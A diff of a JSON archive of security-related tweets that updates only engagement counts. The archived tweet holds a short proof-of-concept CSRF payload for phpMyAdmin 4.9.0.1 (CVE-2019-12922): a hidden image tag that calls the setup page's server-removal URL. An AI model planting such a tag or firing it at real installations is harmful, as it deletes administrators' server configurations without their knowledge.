@@ -154,10 +154,10 @@
     "username": "ptracesecurity"
 }
 {
-    "tweetfavorites": 689,
-    "tweetquotes": 19,
-    "tweetreplies": 16,
-    "tweetretweets": 316,
+    "tweetfavorites": 682,
+    "tweetquotes": 17,
+    "tweetreplies": 15,
+    "tweetretweets": 311,
     "tweettext": "phpMyAdmin 4.9.0.1 CSRF vuln to delete any server(s) - CVE-2019-12922\n\nPoc:\n&lt;p&gt;Deleting Server 1&lt;/p&gt;\n&lt;img src=“\nhttp://server/phpmyadmin/setup/index.php?page=servers&amp;mode=remove&amp;id=1″\nstyle=“display:none;” /&gt;\n\nHappy hacking \n#0day",
     "tweettime": "2019-09-13, 07:56:18",
     "tweeturl": "https://twitter.com/xxByte/status/1172418715717009409",
